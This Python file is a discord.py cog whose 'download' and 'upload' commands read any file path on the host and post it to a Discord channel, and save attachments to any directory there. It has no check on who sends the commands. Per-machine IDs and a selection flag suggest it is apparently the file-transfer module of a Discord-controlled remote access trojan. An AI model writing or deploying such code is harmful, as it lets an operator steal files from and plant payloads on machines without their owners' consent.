import os
import discord
from discord.ext import commands

class FileOps(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(name="download", aliases=["dl", "get"])
    async def download_file(self, ctx, arg: str = None, *, target_path: str = None):
        my_id = getattr(self.bot, 'port_id', 'Unknown')

        if not getattr(self.bot, 'is_selected', False):
            return

        file_input = ""
        should_run = False

        if arg is None:
            await ctx.send(f"**[{my_id}]** Please specify a file path.")
            return

        if target_path is None:
            if arg == my_id:
                await ctx.send(f"**[{my_id}]** Please specify a file path after ID.")
                return
            
            file_input = arg
            should_run = True
        else:
            if arg == my_id:
                file_input = target_path
                should_run = True
            else:
                file_input = f"{arg} {target_path}"
                should_run = True

        if should_run:
            await self.process_download(ctx, file_input)

        
    async def process_download(self, ctx, target_path):
        my_id = getattr(self.bot, 'port_id', 'Unknown')
        
        final_path = ""
        
        if os.path.isabs(target_path):
            final_path = target_path
        else:
            final_path = os.path.abspath(os.path.join(os.getcwd(), target_path))
        
        if not os.path.exists(final_path):
            await ctx.send(f"**[{my_id}]** File not found:\n`{final_path}`")            
            return

        if not os.path.isfile(final_path):
            await ctx.send(f"**[{my_id}]** Directories cannot be downloaded. (Files only)")
            return

        try:
            file_size = os.path.getsize(final_path)
            limit_mb = 8 
            if file_size > limit_mb * 1024 * 1024:
                size_in_mb = file_size / (1024 * 1024)
                await ctx.send(f"**[{my_id}]** Size limit exceeded ({size_in_mb:.2f}MB). Max 8MB allowed.")
                return
        except OSError:
            await ctx.send(f"**[{my_id}]** Cannot read file info (Permission denied).")
            return

        await ctx.send(f"**[{my_id}]** Uploading `{os.path.basename(final_path)}`...")
        
        async with ctx.typing():
            try:
                file = discord.File(final_path)
                await ctx.send(f"**[{my_id}]** Download Complete:", file=file)
            except Exception as e:
                await ctx.send(f"**[{my_id}]** Failed to send: {e}")
        
    @commands.command(name="upload", aliases=["up", "put"])
    async def upload_file(self, ctx, arg: str = None, *, target_path: str = None):        
        my_id = getattr(self.bot, 'port_id', 'Unknown')

        if not getattr(self.bot, 'is_selected', False):
            return
        
        path_input = None
        should_run = False

        if arg is None:
            should_run = True
            path_input = None 

        elif target_path is None:
            if arg == my_id:
                should_run = True
                path_input = None
            else:
                should_run = True
                path_input = arg
        else:
            if arg == my_id:
                should_run = True
                path_input = target_path
            else:
                should_run = True
                path_input = f"{arg} {target_path}"

        if should_run:
            await self.process_upload(ctx, path_input)
        
    async def process_upload(self, ctx, target_path):
        my_id = getattr(self.bot, 'port_id', 'Unknown')

        if not ctx.message.attachments:
            await ctx.send(f"**[{my_id}]** No attachment found. Please attach a file.")
            return

        save_dir = os.getcwd()
        
        if target_path:
            if os.path.isabs(target_path):
                save_dir = target_path
            else:
                save_dir = os.path.abspath(os.path.join(os.getcwd(), target_path))

        if not os.path.exists(save_dir):
            await ctx.send(f"**[{my_id}]** Directory not found:\n`{save_dir}`")            
            return

        await ctx.send(f"**[{my_id}]** Saving {len(ctx.message.attachments)} file(s) to `{save_dir}`...")

        try:
            saved_count = 0
            async with ctx.typing():
                for attachment in ctx.message.attachments:
                    file_path = os.path.join(save_dir, attachment.filename)
                    
                    await attachment.save(file_path)
                    saved_count += 1
            
            await ctx.send(f"**[{my_id}]** Saved successfully: `{saved_count}` files.")

        except Exception as e:
            await ctx.send(f"**[{my_id}]** Upload failed: {e}")

async def setup(bot: commands.Bot):
    await bot.add_cog(FileOps(bot))